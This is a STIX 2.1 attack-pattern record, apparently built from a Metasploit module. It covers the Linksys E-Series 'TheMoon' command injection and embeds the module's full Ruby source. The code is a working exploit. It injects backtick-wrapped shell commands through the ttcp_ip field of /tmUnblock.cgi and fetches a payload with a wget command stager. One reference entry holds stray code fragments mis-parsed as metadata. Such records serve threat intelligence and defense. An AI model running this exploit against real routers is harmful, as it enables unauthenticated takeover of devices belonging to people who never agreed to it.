{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7a32a782-cbb0-40e1-a44e-672989c8f9d4",
    "created": "2024-08-14T17:03:50.630221Z",
    "modified": "2024-08-14T17:03:50.630225Z",
    "name": "Linksys E-Series TheMoon Remote Command Injection",
    "description": " Some Linksys E-Series Routers are vulnerable to an unauthenticated OS command injection. This vulnerability was used from the so-called \"TheMoon\" worm. There are many Linksys systems that are potentially vulnerable, including E4200, E3200, E3000 E2500, E2100L, E2000, E1550, E1500, E1200, E1000, and E900. This module was tested successfully against an E1500 v1.0.5. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/linksys_themoon_exec.rb",
            "external_id": "linksys_themoon_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://isc.sans.edu/diary/Linksys+Worm+%22TheMoon%22+Summary%3A+What+we+know+so+far/17633"
        },
        {
            "source_name": "reference",
            "url": "https://isc.sans.edu/forums/diary/Linksys+Worm+TheMoon+Captured/17630"
        },
        {
            "source_name": "fail_with(Failure::Unknown",
            "external_id": "\"#{peer}-FailedtoaccessthevulnerableURL\")"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Linksys E-Series TheMoon Remote Command Injection',\n      'Description' => %q{\n        Some Linksys E-Series Routers are vulnerable to an unauthenticated OS command\n        injection. This vulnerability was used from the so-called \"TheMoon\" worm. There\n        are many Linksys systems that are potentially vulnerable, including E4200, E3200, E3000,\n        E2500, E2100L, E2000, E1550, E1500, E1200, E1000, and E900. This module was tested\n        successfully against an E1500 v1.0.5.\n      },\n      'Author'      =>\n        [\n          'Johannes Ullrich', #worm discovery\n          'Rew', # original exploit\n          'infodox', # another exploit\n          'Michael Messner <devnull[at]s3cur1ty.de>', # Metasploit module\n          'juan vazquez' # minor help with msf module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'EDB', '31683' ],\n          [ 'BID', '65585' ],\n          [ 'OSVDB', '103321' ],\n          [ 'PACKETSTORM', '125253' ],\n          [ 'PACKETSTORM', '125252' ],\n          [ 'URL', 'https://isc.sans.edu/diary/Linksys+Worm+%22TheMoon%22+Summary%3A+What+we+know+so+far/17633' ],\n          [ 'URL', 'https://isc.sans.edu/forums/diary/Linksys+Worm+TheMoon+Captured/17630' ]\n        ],\n      'DisclosureDate' => '2014-02-13',\n      'Privileged'     => true,\n      'Platform'       => %w{ linux unix },\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'Targets'        =>\n        [\n          [ 'Linux mipsel Payload',\n            {\n            'Arch' => ARCH_MIPSLE,\n            'Platform' => 'linux'\n            }\n          ],\n          [ 'Linux mipsbe Payload',\n            {\n            'Arch' => ARCH_MIPSBE,\n            'Platform' => 'linux'\n            }\n          ],\n        ],\n      'DefaultTarget'   => 0,\n      'DefaultOptions' => { 'WfsDelay' => 30 }\n      ))\n      deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')\n  end\n\n\n  def execute_command(cmd, opts)\n    begin\n      res = send_request_cgi({\n        'uri'    => '/tmUnblock.cgi',\n        'method' => 'POST',\n        'encode_params' => true,\n        'vars_post' => {\n          \"submit_button\" => \"\",\n          \"change_action\" => \"\",\n          \"action\" => \"\",\n          \"commit\" => \"0\",\n          \"ttcp_num\" => \"2\",\n          \"ttcp_size\" => \"2\",\n          \"ttcp_ip\" => \"-h `#{cmd}`\",\n          \"StartEPI\" => \"1\"\n        }\n      }, 2)\n      return res\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'uri'     => '/tmUnblock.cgi',\n        'method'  => 'GET'\n      })\n\n      if res && [200, 301, 302].include?(res.code)\n        return Exploit::CheckCode::Detected\n      end\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    print_status(\"Trying to access the vulnerable URL...\")\n\n    unless check == Exploit::CheckCode::Detected\n      fail_with(Failure::Unknown, \"#{peer} - Failed to access the vulnerable URL\")\n    end\n\n    print_status(\"Exploiting...\")\n    execute_cmdstager({:flavor  => :wget})\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-02-13",
    "x_mitre_platforms": [
        "linux"
    ]
}